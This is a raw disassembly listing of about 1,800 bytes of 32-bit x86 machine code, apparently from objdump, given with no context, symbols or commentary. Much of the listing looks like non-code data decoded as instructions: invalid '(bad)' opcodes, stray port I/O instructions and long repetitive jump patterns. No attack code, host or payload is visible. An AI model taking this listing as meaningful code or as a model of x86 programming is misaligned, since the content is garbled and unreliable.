  43ae2e:	sub    DWORD PTR [eax+edi*1+0x389d7d00],ebx
  43ae35:	add    BYTE PTR [ebp+eax*1+0x0],cl
  43ae39:	add    BYTE PTR [ebx-0x5e000915],ch
  43ae3f:	xchg   esi,eax
  43ae40:	cmp    BYTE PTR [eax],al
  43ae42:	mov    ch,0x96
  43ae44:	cmp    BYTE PTR [eax],al
  43ae46:	dec    esp
  43ae47:	add    eax,0xeb6b0000
  43ae4c:	idiv   bh
  43ae4e:	popa   
  43ae4f:	mov    ah,0x3f
  43ae51:	add    BYTE PTR [ebp-0x4c],dl
  43ae54:	aas    
  43ae55:	add    BYTE PTR [eax*1-0x14950000],cl
  43ae5c:	idiv   bh
  43ae5e:	in     eax,0xb2
  43ae60:	aas    
  43ae61:	add    cl,bh
  43ae63:	mov    dl,0x3f
  43ae65:	add    BYTE PTR [eax*1-0x16150000],cl
  43ae6c:	idiv   bh
  43ae6e:	sub    al,cl
  43ae70:	aas    
  43ae71:	add    BYTE PTR [ecx+ecx*8+0x3f],bh
  43ae75:	add    ah,cl
  43ae77:	add    al,0x0
  43ae79:	add    BYTE PTR [ebx-0x7a000917],ch
  43ae7f:	mov    dl,0x3f
  43ae81:	add    BYTE PTR [ecx-0x33ffc04e],bl
  43ae87:	add    al,0x0
  43ae89:	add    BYTE PTR [eax],al
  43ae8b:	add    BYTE PTR [eax],al
  43ae8d:	add    BYTE PTR [eax],al
  43ae8f:	jmp    0x43ae7a
  43ae91:	idiv   bh
  43ae93:	cli    
  43ae94:	stos   DWORD PTR es:[edi],eax
  43ae95:	aas    
  43ae96:	add    dh,ch
  43ae98:	stos   DWORD PTR es:[edi],eax
  43ae99:	aas    
  43ae9a:	add    BYTE PTR [esp+eax*1+0x70750000],cl
  43aea1:	sub    cl,bh
  43aea3:	mov    dl,BYTE PTR [ebx+0x4a]
  43aea6:	inc    eax
  43aea7:	jne    0x43af09
  43aea9:	dec    edx
  43aeaa:	inc    eax
  43aeab:	jne    0x43aed8
  43aead:	std    
  43aeae:	push   DWORD PTR [ebp-0x70]
  43aeb1:	daa    
  43aeb2:	stc    
  43aeb3:	push   0xffffffd2
  43aeb5:	je     0x43aef6
  43aeb7:	jne    0x43af16
  43aeb9:	jne    0x43aefa
  43aebb:	jne    0x43aee6
  43aebd:	std    
  43aebe:	push   DWORD PTR [ebp-0x50]
  43aec1:	daa    
  43aec2:	stc    
  43aec3:	dec    edx
  43aec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aec5:	ss inc eax
  43aec7:	jne    0x43ae58
  43aec9:	ss inc eax
  43aecb:	jne    0x43aef6
  43aecd:	std    
  43aece:	push   DWORD PTR [ebp-0x30]
  43aed1:	daa    
  43aed2:	stc    
  43aed3:	sub    ah,BYTE PTR [esi]
  43aed5:	xor    al,BYTE PTR [eax+0x75]
  43aed8:	imul   esi,DWORD PTR [edx],0xfd297540
  43aede:	push   DWORD PTR [ebp+0x56]
  43aee1:	test   ah,ch
  43aee3:	push   edx
  43aee4:	mov    ds:0x77a74f19,al
  43aee9:	adc    eax,0xfd296580
  43aeee:	pop    edi
  43aeef:	test   BYTE PTR [ecx],ch
  43aef1:	std    
  43aef2:	pop    ebx
  43aef3:	add    BYTE PTR [eax],al
  43aef5:	add    BYTE PTR [eax],al
  43aef7:	add    BYTE PTR [ecx+ebp*1+0x298457fd],al
  43aefe:	std    
  43aeff:	push   ebx
  43af00:	test   BYTE PTR [ecx],ch
  43af02:	std    
  43af03:	arpl   WORD PTR [ecx+ebp*1-0x3],sp
  43af07:	fwait
  43af08:	fs sub ebp,edi
  43af0b:	xchg   DWORD PTR [ecx+ebp*1-0x3],esp
  43af0f:	and    DWORD PTR [ecx+ebp*1-0x3],0x3f
  43af14:	test   BYTE PTR [ecx],ch
  43af16:	std    
  43af17:	cmp    eax,DWORD PTR [ecx+ebp*1+0x28437fd]
  43af1e:	out    0x3,eax
  43af20:	popa   
  43af21:	icebp  
  43af22:	out    0x3,al
  43af24:	cmp    ecx,esi
  43af26:	out    0x3,al
  43af28:	or     ecx,esi
  43af2a:	out    0x3,al
  43af2c:	or     eax,0x4203e6f1
  43af31:	cld    
  43af32:	out    0x3,al
  43af34:	xchg   ebp,eax
  43af35:	icebp  
  43af36:	out    0x3,al
  43af38:	mov    ecx,esi
  43af3a:	out    0x3,al
  43af3c:	jge    0x43af2f
  43af3e:	out    0x3,al
  43af40:	xor    ecx,0xf19903e6
  43af46:	out    0x3,al
  43af48:	test   eax,0xad03e6f1
  43af4d:	icebp  
  43af4e:	out    0x3,al
  43af50:	mov    cl,0xf1
  43af52:	out    0x3,al
  43af54:	jne    0x43af47
  43af56:	out    0x3,al
  43af58:	sub    edx,esi
  43af5a:	out    0x3,al
  43af5c:	add    BYTE PTR [eax],al
  43af5e:	add    BYTE PTR [eax],al
  43af60:	add    BYTE PTR ds:0x2103e6f2,bl
  43af66:	repnz out 0x3,al
  43af69:	jns    0x43af5c
  43af6b:	out    0x3,al
  43af6d:	dec    ecx
  43af6e:	icebp  
  43af6f:	out    0x3,al
  43af71:	dec    ebp
  43af72:	icebp  
  43af73:	out    0x3,al
  43af75:	push   ecx
  43af76:	icebp  
  43af77:	out    0x3,al
  43af79:	aad    0xf1
  43af7b:	out    0x3,al
  43af7d:	leave  
  43af7e:	icebp  
  43af7f:	out    0x3,al
  43af81:	mov    ebp,0xc103e6f1
  43af86:	icebp  
  43af87:	out    0x3,al
  43af89:	fyl2x  
  43af8b:	out    0x3,al
  43af8d:	imul   esi,ecx,0xf11703e6
  43af93:	out    0x3,al
  43af95:	jno    0x43af88
  43af97:	out    0x3,al
  43af99:	mov    ch,0xf1
  43af9b:	(bad)  
  43af9c:	call   0xe9540617
  43afa1:	jbe    0x43affd
  43afa3:	adc    cl,ch
  43afa5:	jbe    0x43aff5
  43afa7:	adc    cl,ch
  43afa9:	jbe    0x43afe9
  43afab:	adc    cl,ch
  43afad:	jbe    0x43afc5
  43afaf:	adc    cl,ch
  43afb1:	jbe    0x43af37
  43afb3:	psubsw mm6,QWORD PTR [esi+0x1e]
  43afb7:	adc    cl,ch
  43afb9:	jbe    0x43b01d
  43afbb:	adc    cl,ch
  43afbd:	jbe    0x43b035
  43afbf:	adc    cl,ch
  43afc1:	jbe    0x43b03d
  43afc3:	adc    cl,ch
  43afc5:	add    BYTE PTR [eax],al
  43afc7:	add    BYTE PTR [eax],al
  43afc9:	add    BYTE PTR [esi+0x6e],dh
  43afcc:	adc    cl,ch
  43afce:	jbe    0x43b02e
  43afd0:	adc    cl,ch
  43afd2:	jbe    0x43b00a
  43afd4:	adc    cl,ch
  43afd6:	jbe    0x43af78
  43afd8:	push   cs
  43afd9:	jmp    0xe953ee54
  43afde:	jbe    0x43af62
  43afe0:	adc    cl,ch
  43afe2:	jbe    0x43af7a
  43afe4:	psubsw mm6,QWORD PTR [esi-0x66]
  43afe8:	psubsw mm6,QWORD PTR [esi-0x72]
  43afec:	psubsw mm6,QWORD PTR [esi+0x7e]
  43aff0:	adc    cl,ch
  43aff2:	jbe    0x43b04a
  43aff4:	adc    cl,ch
  43aff6:	jbe    0x43afb8
  43aff8:	push   cs
  43aff9:	jmp    0xe9540e74
  43affe:	jbe    0x43aff2
  43b000:	push   cs
  43b001:	jmp    0xe952b67c
  43b006:	jbe    0x43b012
  43b008:	psubsw mm6,QWORD PTR [esi-0x2]
  43b00c:	push   cs
  43b00d:	jmp    0xe952b288
  43b012:	jbe    0x43b02a
  43b014:	adc    cl,ch
  43b016:	jbe    0x43b032
  43b018:	adc    BYTE PTR [eax],al
  43b01a:	int3   
  43b01b:	add    esp,esi
  43b01d:	adc    BYTE PTR [ecx+eax*1+0x19c10c4],bl
  43b024:	rcl    BYTE PTR [eax],0x8c
  43b027:	add    DWORD PTR [eax+edx*1+0x10b8018c],edi
  43b02e:	add    BYTE PTR [eax],al
  43b030:	add    BYTE PTR [eax],al
  43b032:	add    BYTE PTR [ecx+eax*1+0x19c10b4],bl
  43b039:	mov    al,0x10
  43b03b:	mov    WORD PTR [ecx],es
  43b03d:	lods   al,BYTE PTR ds:[esi]
  43b03e:	adc    BYTE PTR [ecx+eax*1+0x15c10a8],cl
  43b045:	xor    BYTE PTR [eax],dl
  43b047:	pop    esp
  43b048:	add    DWORD PTR [eax+edx*1],ebp
  43b04b:	dec    esp
  43b04c:	add    DWORD PTR [eax],ebp
  43b04e:	adc    BYTE PTR [ecx+eax*1+0x24],cl
  43b052:	adc    BYTE PTR [ecx+eax*1+0x20],bl
  43b056:	adc    BYTE PTR [ecx+eax*1+0x1c],bl
  43b05a:	adc    BYTE PTR [ecx+eax*1+0x18],cl
  43b05e:	adc    BYTE PTR [ecx+eax*1+0x14],cl
  43b062:	adc    BYTE PTR [ecx+eax*1],bl
  43b065:	adc    BYTE PTR [eax],dl
  43b067:	sbb    al,0x1
  43b069:	or     al,0x10
  43b06b:	or     al,0x1
  43b06d:	or     BYTE PTR [eax],dl
  43b06f:	or     al,0x1
  43b071:	add    al,0x10
  43b073:	sbb    al,0x1
  43b075:	add    BYTE PTR [eax],dl
  43b077:	sbb    al,0x1
  43b079:	cld    
  43b07a:	(bad)  
  43b07c:	add    eax,edi
  43b07e:	(bad)  
  43b080:	add    esp,esi
  43b082:	paddusb mm0,QWORD PTR [eax]
  43b085:	lock paddusb mm0,QWORD PTR [eax]
  43b089:	in     al,dx
  43b08a:	bswap  esp
  43b08c:	add    BYTE PTR [esi],al
  43b08e:	adc    esp,ecx
  43b090:	add    ah,dl
  43b092:	paddusb mm0,QWORD PTR [eax]
  43b095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b096:	adc    BYTE PTR [eax],al
  43b098:	add    BYTE PTR [eax],al
  43b09a:	add    BYTE PTR [eax],al
  43b09c:	jne    0x43b0c9
  43b09e:	std    
  43b09f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b0a0:	gs sub edi,ebp
  43b0a3:	mov    eax,0xebfd2b62
  43b0a8:	mov    ch,BYTE PTR [ebx]
  43b0aa:	std    
  43b0ab:	inc    BYTE PTR [ebx+ebp*1+0x2b84a3fd]
  43b0b2:	std    
  43b0b3:	retf   
  43b0b4:	push   0x2b
  43b0b6:	std    
  43b0b7:	sub    BYTE PTR [ebp+0x2b],ah
  43b0ba:	std    
  43b0bb:	mov    edi,0xbbfd2b7a
  43b0c0:	jb     0x43b0ed
  43b0c2:	std    
  43b0c3:	mov    bh,0x6a
  43b0c5:	sub    edi,ebp
  43b0c7:	mov    bl,0x82
  43b0c9:	sub    ebp,edi
  43b0cb:	mov    bl,0x7a
  43b0cd:	sub    ebp,edi
  43b0cf:	scas   eax,DWORD PTR es:[edi]
  43b0d0:	jb     0x43b0fb
  43b0d2:	std    
  43b0d3:	stos   DWORD PTR es:[edi],eax
  43b0d4:	push   0x29
  43b0d6:	std    
  43b0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b0d8:	sub    BYTE PTR [ecx],0xfd
  43b0db:	mov    ds:0x9ffd297a,eax
  43b0e0:	jb     0x43b10b
  43b0e2:	std    
  43b0e3:	fwait
  43b0e4:	push   0x29
  43b0e6:	std    
  43b0e7:	xchg   edi,eax
  43b0e8:	sub    BYTE PTR [ecx],0xfd
  43b0eb:	xchg   ebx,eax
  43b0ec:	jp     0x43b117
  43b0ee:	std    
  43b0ef:	(bad)  
  43b0f0:	jb     0x43b11b
  43b0f2:	std    
  43b0f3:	mov    ebp,DWORD PTR [edx+0x29]
  43b0f6:	std    
  43b0f7:	xchg   DWORD PTR [edx+0x7a83fd29],eax
  43b0fd:	sub    ebp,edi
  43b0ff:	jg     0x43b101
  43b101:	add    BYTE PTR [eax],al
  43b103:	add    BYTE PTR [eax],al
  43b105:	jb     0x43b130
  43b107:	std    
  43b108:	jnp    0x43b174
  43b10a:	sub    ebp,edi
  43b10c:	ja     0x43b090
  43b10e:	sub    ebp,edi
  43b110:	aam    0x7a
  43b112:	sub    ebp,edi
  43b114:	loope  0x43b09a
  43b116:	sub    ebp,edi
  43b118:	retf   
  43b119:	test   BYTE PTR [edx],al
  43b11b:	out    0x3,eax
  43b11d:	mov    esp,0x2503e703
  43b122:	add    esp,edi
  43b124:	add    esi,DWORD PTR [ecx]
  43b126:	add    esp,edi
  43b128:	add    ebp,DWORD PTR ds:0x3903e703
  43b12e:	add    esp,edi
  43b130:	add    esi,DWORD PTR ds:0x6103e703
  43b136:	add    esp,edi
  43b138:	add    ebx,DWORD PTR [ebp+0x3]
  43b13b:	out    0x3,eax
  43b13d:	dec    ecx
  43b13e:	add    esp,edi
  43b140:	add    eax,DWORD PTR [ebp+0x3]
  43b143:	out    0x3,eax
  43b145:	push   ecx
  43b146:	add    esp,edi
  43b148:	add    ecx,DWORD PTR [ebp+0x3]
  43b14b:	out    0x3,eax
  43b14d:	mov    edi,0xa503e6f1
  43b152:	add    esp,edi
  43b154:	add    edx,DWORD PTR [ecx-0x72fc18fd]
  43b15a:	add    esp,edi
  43b15c:	add    ebx,DWORD PTR [ecx-0x6afc18fd]
  43b162:	add    esp,edi
  43b164:	add    esp,DWORD PTR [ecx+0x3]
  43b167:	out    0x3,eax
  43b169:	add    BYTE PTR [eax],al
  43b16b:	add    BYTE PTR [eax],al
  43b16d:	add    BYTE PTR [ebp+0x3],bl
  43b170:	out    0x3,eax
  43b172:	mov    DWORD PTR [ebx],eax
  43b174:	out    0x3,eax
  43b176:	test   DWORD PTR [ebx],eax
  43b178:	out    0x3,eax
  43b17a:	jno    0x43b17f
  43b17c:	out    0x3,eax
  43b17e:	fdiv   st,st(1)
  43b180:	out    0x3,al
  43b182:	jns    0x43b187
  43b184:	out    0x3,eax
  43b186:	jne    0x43b18b
  43b188:	out    0x3,eax
  43b18a:	add    DWORD PTR [edi+eiz*8],eax
  43b18d:	add    edi,ebp
  43b18f:	add    esp,edi
  43b191:	add    ebp,ecx
  43b193:	add    esp,edi
  43b195:	add    esi,DWORD PTR [ecx]
  43b197:	repnz (bad) 
  43b199:	call   0xe9536414
  43b19e:	jbe    0x43b176
  43b1a0:	psubsw mm6,QWORD PTR [esi-0x36]
  43b1a4:	psubsw mm6,QWORD PTR [esi+0x22]
  43b1a8:	or     ch,cl
  43b1aa:	jbe    0x43b1e2
  43b1ac:	or     ch,cl
  43b1ae:	jbe    0x43b1ea
  43b1b0:	or     ch,cl
  43b1b2:	jbe    0x43b1e2
  43b1b4:	or     ch,cl
  43b1b6:	jbe    0x43b1e6
  43b1b8:	or     ch,cl
  43b1ba:	jbe    0x43b1c2
  43b1bc:	or     ecx,ebp
  43b1be:	jbe    0x43b20a
  43b1c0:	or     ch,cl
  43b1c2:	jbe    0x43b202
  43b1c4:	or     ch,cl
  43b1c6:	jbe    0x43b20a
  43b1c8:	or     ch,cl
  43b1ca:	jbe    0x43b222
  43b1cc:	or     ch,cl
  43b1ce:	jbe    0x43b22a
  43b1d0:	or     ch,cl
  43b1d2:	add    BYTE PTR [eax],al
  43b1d4:	add    BYTE PTR [eax],al
  43b1d6:	add    BYTE PTR [esi+0x56],dh
  43b1d9:	or     ch,cl
  43b1db:	jbe    0x43b233
  43b1dd:	or     ch,cl
  43b1df:	jbe    0x43b233
  43b1e1:	or     ch,cl
  43b1e3:	jbe    0x43b243
  43b1e5:	or     ch,cl
  43b1e7:	jbe    0x43b243
  43b1e9:	or     ch,cl
  43b1eb:	jbe    0x43b253
  43b1ed:	or     ch,cl
  43b1ef:	jbe    0x43b253
  43b1f1:	or     ch,cl
  43b1f3:	jbe    0x43b263
  43b1f5:	or     ch,cl
  43b1f7:	jbe    0x43b263
  43b1f9:	or     ch,cl
  43b1fb:	jbe    0x43b21f
  43b1fd:	or     ch,cl
  43b1ff:	jbe    0x43b22f
  43b201:	or     ch,cl
  43b203:	jbe    0x43b22f
  43b205:	or     ch,cl
  43b207:	jbe    0x43b23f
  43b209:	or     ch,cl
  43b20b:	jbe    0x43b23f
  43b20d:	or     ch,cl
  43b20f:	jbe    0x43b24f
  43b211:	or     ch,cl
  43b213:	jbe    0x43b24f
  43b215:	or     al,BYTE PTR [eax]
  43b217:	fadd   QWORD PTR ds:0x5dc0ec4
  43b21d:	ror    DWORD PTR [esi],cl
  43b21f:	int3   
  43b220:	add    eax,0x5cc0ecf
  43b225:	scas   eax,DWORD PTR es:[edi]
  43b226:	paddusb mm0,QWORD PTR ds:0x5dc0e64
  43b22d:	jle    0x43b23e
  43b22f:	int3   
  43b230:	add    eax,0x5cc0f7a
  43b235:	mov    ebx,0x3d059c0e
  43b23a:	sldt   WORD PTR [eax]
  43b23d:	add    BYTE PTR [eax],al
  43b23f:	add    BYTE PTR [ebp+eax*1+0x58c0f6c],bl
  43b246:	dec    esp
  43b247:	push   cs
  43b248:	mov    WORD PTR ds:0x59c0f8f,es
  43b24e:	inc    esp
  43b24f:	push   cs
  43b250:	pushf  
  43b251:	add    eax,0x58c0e40
  43b256:	inc    eax
  43b257:	push   cs
  43b258:	mov    WORD PTR ds:0x55c0e68,es
  43b25e:	xor    al,0xe
  43b260:	pop    esp
  43b261:	add    eax,0x54c0e20
  43b266:	sbb    al,0xe
  43b268:	dec    esp
  43b269:	add    eax,0x55c0e18
  43b26e:	adc    al,0xe
  43b270:	pop    esp
  43b271:	add    eax,0x54c0f23
  43b276:	pop    ds
  43b277:	cmovl  eax,DWORD PTR ds:0x51c0e18
  43b27e:	adc    al,0xe
  43b280:	sbb    al,0x5
  43b282:	adc    BYTE PTR [edi],0xc
  43b285:	add    eax,0x50c17bc
  43b28a:	dec    ecx
  43b28b:	sbb    BYTE PTR [eax*1+0x51c18a7],bl
  43b292:	and    bl,BYTE PTR [ecx]
  43b294:	jne    0x43b2b1
  43b296:	std    
  43b297:	ja     0x43b2f5
  43b299:	sbb    edi,ebp
  43b29b:	(bad)  [ebx+ebx*1+0x1b8f2efd]
  43b2a2:	std    
  43b2a3:	repz add BYTE PTR [eax],al
  43b2a6:	add    BYTE PTR [eax],al
  43b2a8:	add    BYTE PTR [eax+0x1b],dh
  43b2ab:	std    
  43b2ac:	out    dx,eax
  43b2ad:	push   0x80ebfd1b
  43b2b2:	sbb    edi,ebp
  43b2b4:	out    0x78,eax
  43b2b6:	sbb    edi,ebp
  43b2b8:	jecxz  0x43b32a
  43b2ba:	sbb    edi,ebp
  43b2bc:	fild   QWORD PTR [eax+0x1b]
  43b2bf:	std    
  43b2c0:	fild   DWORD PTR [eax+0x78d7fd1b]
  43b2c6:	sbb    edi,ebp
  43b2c8:	(bad)  
  43b2ca:	sbb    edi,ebp
  43b2cc:	or     ebp,DWORD PTR [ebx+0x1b]
  43b2cf:	std    
  43b2d0:	rol    DWORD PTR [edx+0x78c7fd1b],0x1b
  43b2d7:	std    
  43b2d8:	mov    edi,0xbbfd1b70
  43b2dd:	push   0x80b7fd1b
  43b2e2:	sbb    ebp,edi
  43b2e4:	mov    bl,0x78
  43b2e6:	sbb    ebp,edi
  43b2e8:	jns    0x43b35d
  43b2ea:	sbb    ebp,edi
  43b2ec:	stos   DWORD PTR es:[edi],eax
  43b2ed:	push   0x68ecfd19
  43b2f2:	sbb    ebp,edi
  43b2f4:	xor    DWORD PTR [ebx+0x19],esp
  43b2f7:	std    
  43b2f8:	lahf   
  43b2f9:	jo     0x43b314
  43b2fb:	std    
  43b2fc:	fwait
  43b2fd:	push   0x852bfd19
  43b302:	sbb    ebp,edi
  43b304:	push   ebp
  43b305:	test   DWORD PTR [ecx],ebx
  43b307:	std    
  43b308:	(bad)  
  43b309:	jo     0x43b324
  43b30b:	std    
  43b30c:	mov    eax,DWORD PTR [eax]
  43b30e:	add    BYTE PTR [eax],al
  43b310:	add    BYTE PTR [eax],al
  43b312:	push   0x8087fd19
  43b317:	add    ah,bh
  43b319:	add    esi,ecx
  43b31b:	std    
  43b31c:	out    0x3,al
  43b31e:	cmc    
  43b31f:	std    
  43b320:	out    0x3,al
  43b322:	jns    0x43b321
  43b324:	out    0x3,al
  43b326:	sbb    eax,0xb603e6f3
  43b32b:	repnz out 0x3,al
  43b32e:	ret    
  43b32f:	repnz out 0x3,al
  43b332:	fdivr  st(2),st
  43b334:	out    0x3,al
  43b336:	sub    eax,0x2103e6fd
  43b33b:	std    
  43b33c:	out    0x3,al
  43b33e:	(bad)  
  43b33f:	jmp    esi
  43b341:	add    ebx,DWORD PTR [ecx]
  43b343:	std    
  43b344:	out    0x3,al
  43b346:	dec    ebp
  43b347:	std    
  43b348:	out    0x3,al
  43b34a:	inc    ecx
  43b34b:	std    
  43b34c:	out    0x3,al
  43b34e:	inc    ebp
  43b34f:	std    
  43b350:	out    0x3,al
  43b352:	sub    ebp,edi
  43b354:	out    0x3,al
  43b356:	xlat   BYTE PTR ds:[ebx]
  43b357:	jmp    esi
  43b359:	add    esi,DWORD PTR [ecx]
  43b35b:	std    
  43b35c:	out    0x3,al
  43b35e:	(bad)  
  43b360:	out    0x3,al
  43b362:	dec    ecx
  43b363:	std    
  43b364:	out    0x3,al
  43b366:	lods   eax,DWORD PTR ds:[esi]
  43b367:	std    
  43b368:	out    0x3,al
  43b36a:	sti    
  43b36b:	(bad)  
  43b36c:	out    0x3,al
  43b36e:	xchg   ebp,eax
  43b36f:	std    
  43b370:	out    0x3,al
  43b372:	jns    0x43b371
  43b374:	out    0x3,al
  43b376:	add    BYTE PTR [eax],al
  43b378:	add    BYTE PTR [eax],al
  43b37a:	add    BYTE PTR [ebp-0x3],ch
  43b37d:	out    0x3,al
  43b37f:	popa   
  43b380:	std    
  43b381:	out    0x3,al
  43b383:	gs std 
  43b385:	out    0x3,al
  43b387:	imul   edi,ebp,0xfd7d03e6
  43b38d:	out    0x3,al
  43b38f:	jno    0x43b38e
  43b391:	out    0x3,al
  43b393:	div    ch
  43b395:	(bad)  
  43b396:	call   0xe94fc211
  43b39b:	jbe    0x43b3a7
  43b39d:	or     al,0xe9
  43b39f:	jbe    0x43b3b7
  43b3a1:	or     al,0xe9
  43b3a3:	jbe    0x43b3b7
  43b3a5:	or     al,0xe9
  43b3a7:	jbe    0x43b3c7
  43b3a9:	or     al,0xe9
  43b3ab:	jbe    0x43b3c7
  43b3ad:	or     al,0xe9
  43b3af:	jbe    0x43b3d7
  43b3b1:	or     al,0xe9
  43b3b3:	jbe    0x43b38f
  43b3b5:	or     ecx,ebp
  43b3b7:	jbe    0x43b39f
  43b3b9:	or     ecx,ebp
  43b3bb:	jbe    0x43b39f
  43b3bd:	or     ecx,ebp
  43b3bf:	jbe    0x43b3af
  43b3c1:	or     ecx,ebp
  43b3c3:	jbe    0x43b391
  43b3c5:	or     cl,ch
  43b3c7:	jbe    0x43b3a1
  43b3c9:	or     cl,ch
  43b3cb:	jbe    0x43b3a1
  43b3cd:	or     cl,ch
  43b3cf:	jbe    0x43b3b1
  43b3d1:	or     cl,ch
  43b3d3:	jbe    0x43b417
  43b3d5:	or     al,0xe9
  43b3d7:	jbe    0x43b427
  43b3d9:	or     al,0xe9
  43b3db:	jbe    0x43b427
  43b3dd:	or     al,0xe9
  43b3df:	add    BYTE PTR [eax],al
  43b3e1:	add    BYTE PTR [eax],al
  43b3e3:	add    BYTE PTR [esi+0x56],dh
  43b3e6:	or     al,0xe9
  43b3e8:	jbe    0x43b43c
  43b3ea:	or     al,0xe9
  43b3ec:	jbe    0x43b44c
  43b3ee:	or     al,0xe9
  43b3f0:	jbe    0x43b44c
  43b3f2:	or     al,0xe9
  43b3f4:	jbe    0x43b45c
  43b3f6:	or     al,0xe9
  43b3f8:	jbe    0x43b44c
  43b3fa:	or     al,0xe9
  43b3fc:	jbe    0x43b45c
  43b3fe:	or     al,0xe9
  43b400:	jbe    0x43b45c
  43b402:	or     al,0xe9
  43b404:	jbe    0x43b46c
  43b406:	or     al,0xe9
  43b408:	jbe    0x43b46c
  43b40a:	or     al,0xe9
  43b40c:	jbe    0x43b47c
  43b40e:	or     al,0xe9
  43b410:	jbe    0x43b422
  43b412:	or     al,BYTE PTR [eax]
  43b414:	sbb    al,0x2
  43b416:	jmp    0xc15:0xbc020c0e
  43b41d:	add    ah,dl
  43b41f:	push   cs
  43b420:	sbb    al,0x2
  43b422:	rcl    DWORD PTR ds:0xeda021c,cl
  43b428:	or     al,0x2
  43b42a:	(bad)  
  43b42b:	push   cs
  43b42c:	or     al,0x2
  43b42e:	ror    BYTE PTR [esi],cl
  43b430:	fadd   QWORD PTR [ecx]
  43b432:	into   
  43b433:	push   cs
  43b434:	fadd   QWORD PTR [ecx]
  43b436:	retf   0xcc0e
  43b439:	add    DWORD PTR [eax+0xc],esp
  43b43c:	int3   
  43b43d:	add    DWORD PTR [esp+ecx*1-0x24],ebx
  43b441:	add    DWORD PTR [eax+0xc],ebx
  43b444:	fadd   QWORD PTR [ecx]
  43b446:	push   esp
  43b447:	or     al,0x0
  43b449:	add    BYTE PTR [eax],al
  43b44b:	add    BYTE PTR [eax],al
  43b44d:	int3   
  43b44e:	add    DWORD PTR [eax+0xc],edx
  43b451:	int3   
  43b452:	add    DWORD PTR [esp+ecx*1-0x64],ecx
  43b456:	add    DWORD PTR [eax+0xc],ecx
  43b459:	pushf  
  43b45a:	add    DWORD PTR [esp+ecx*1-0x74],eax
  43b45e:	add    DWORD PTR [eax+0xc],eax
  43b461:	mov    WORD PTR [ecx],es
  43b463:	cmp    al,0xc
  43b465:	pushf  
  43b466:	add    DWORD PTR [eax],edi
  43b468:	or     al,0x9c
  43b46a:	add    DWORD PTR [esp+ecx*1],esi
  43b46d:	mov    WORD PTR [ecx],es
  43b46f:	xor    BYTE PTR [esp+ecx*4],cl
  43b472:	add    DWORD PTR [esp+ecx*1],ebp
  43b475:	pop    esp
  43b476:	add    DWORD PTR [eax],ebp
  43b478:	or     al,0x5c
  43b47a:	add    DWORD PTR [esp+ecx*1],esp
  43b47d:	dec    esp
  43b47e:	add    DWORD PTR [eax],esp
  43b480:	or     al,0x4c
  43b482:	add    DWORD PTR [esp+ecx*1],ebx
  43b485:	pop    esp
  43b486:	add    DWORD PTR [eax],ebx
  43b488:	or     al,0x5c
  43b48a:	add    DWORD PTR [esp+ecx*1],edx
  43b48d:	dec    esp
  43b48e:	add    DWORD PTR [eax],edx
  43b490:	or     al,0x75
  43b492:	sbb    edi,ebp
  43b494:	or     eax,DWORD PTR [ecx+0x7907fd1b]
  43b49a:	sbb    edi,ebp
  43b49c:	add    esi,DWORD PTR [ecx+0x1b]
  43b49f:	std    
  43b4a0:	jmp    FWORD PTR [ecx+0x1b]
  43b4a3:	std    
  43b4a4:	sti    
  43b4a5:	jle    0x43b4c2
  43b4a7:	std    
  43b4a8:	idiv   DWORD PTR [esi+0x1b]
  43b4ab:	std    
  43b4ac:	rep outs dx,BYTE PTR ds:[esi]
  43b4ae:	sbb    edi,ebp
  43b4b0:	out    dx,eax
  43b4b1:	add    BYTE PTR [eax],al
  43b4b3:	add    BYTE PTR [eax],al
  43b4b5:	add    BYTE PTR [esi+0x1b],ch
  43b4b8:	std    
  43b4b9:	jmp    0x43b539
  43b4bb:	sbb    edi,ebp
  43b4bd:	out    0x7e,eax
  43b4bf:	sbb    edi,ebp
  43b4c1:	jecxz  0x43b531
  43b4c3:	sbb    edi,ebp
  43b4c5:	fild   QWORD PTR [esi+0x1b]
  43b4c8:	std    
  43b4c9:	fstp   TBYTE PTR [esi+0x1b]
  43b4cc:	std    
  43b4cd:	xlat   BYTE PTR ds:[ebx]
  43b4ce:	jle    0x43b4eb
  43b4d0:	std    
  43b4d1:	shr    DWORD PTR [esi+0x1b],cl
  43b4d4:	std    
  43b4d5:	iret   
  43b4d6:	outs   dx,BYTE PTR ds:[esi]
  43b4d7:	sbb    edi,ebp
  43b4d9:	retf   
  43b4da:	jle    0x43b4f7
  43b4dc:	std    
  43b4dd:	(bad)  
  43b4de:	jle    0x43b4fb
  43b4e0:	std    
  43b4e1:	ret    
  43b4e2:	outs   dx,BYTE PTR ds:[esi]
  43b4e3:	sbb    edi,ebp
  43b4e5:	mov    edi,0xbbfd1b6e
  43b4ea:	jle    0x43b507
  43b4ec:	std    
  43b4ed:	mov    bh,0x7e
  43b4ef:	sbb    edi,ebp
  43b4f1:	mov    bl,0x6e
  43b4f3:	sbb    edi,ebp
  43b4f5:	(bad)  
  43b4f6:	outs   dx,BYTE PTR ds:[esi]
  43b4f7:	sbb    edi,ebp
  43b4f9:	ret    0x197e
  43b4fc:	std    
  43b4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b4fe:	jle    0x43b519
  43b500:	std    
  43b501:	mov    ds:0x9ffd196e,eax
  43b506:	outs   dx,BYTE PTR ds:[esi]
  43b507:	sbb    ebp,edi
  43b509:	mov    DWORD PTR [ebp+0x19],esp
  43b50c:	std    
  43b50d:	adc    ah,BYTE PTR [edx+eax*1-0x19]
  43b511:	add    esp,ecx
  43b513:	icebp  
  43b514:	out    0x3,al
  43b516:	in     eax,0xf7
  43b518:	out    0x3,al
  43b51a:	add    BYTE PTR [eax],al
  43b51c:	add    BYTE PTR [eax],al
  43b51e:	add    BYTE PTR [ecx],al
  43b520:	clc    
  43b521:	out    0x3,al
  43b523:	std    
  43b524:	mul    esi
  43b526:	add    ecx,DWORD PTR [ecx]
  43b528:	clc    
  43b529:	out    0x3,al
  43b52b:	cmc    
  43b52c:	mul    esi
  43b52e:	add    edx,DWORD PTR [ecx+0x1703e6f7]
  43b534:	(bad)  
  43b535:	out    0x3,al
  43b537:	and    edi,esi
  43b539:	out    0x3,al
  43b53b:	test   edi,esi
  43b53d:	out    0x3,al
  43b53f:	popa   
  43b540:	mul    esi
  43b542:	add    ebx,DWORD PTR [ebp-0x9]
  43b545:	out    0x3,al
  43b547:	pop    ecx
  43b548:	mul    esi
